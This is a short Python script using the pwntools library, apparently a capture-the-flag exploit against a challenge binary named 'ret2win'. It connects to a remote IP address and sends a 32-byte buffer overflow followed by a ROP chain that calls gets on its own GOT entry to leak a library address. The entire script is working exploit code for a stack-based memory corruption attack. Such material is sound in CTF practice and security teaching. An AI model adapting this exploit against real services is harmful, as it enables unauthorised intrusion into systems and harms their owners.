#!/usr/bin/env python

from pwn import *
from pwnlib import *

context.arch = 'amd64'

elf = ELF("./ret2win")
p = remote('3.71.110.92', 30001)

rop = ROP(elf)
rop.call(elf.symbols["gets"], [elf.got['gets']])
rop.call(elf.symbols['pwnme'])


offset = 32
payload = [
    b"A"*offset,
    rop.chain(),
]
payload = b"".join(payload)
p.sendline(payload)

gets = (p.recvuntil(b":").rstrip().ljust(8,b"\x00"))
print(f"gets found at {gets}")
# print(rop.chain())
# print(p.recvall())
# p.interactive()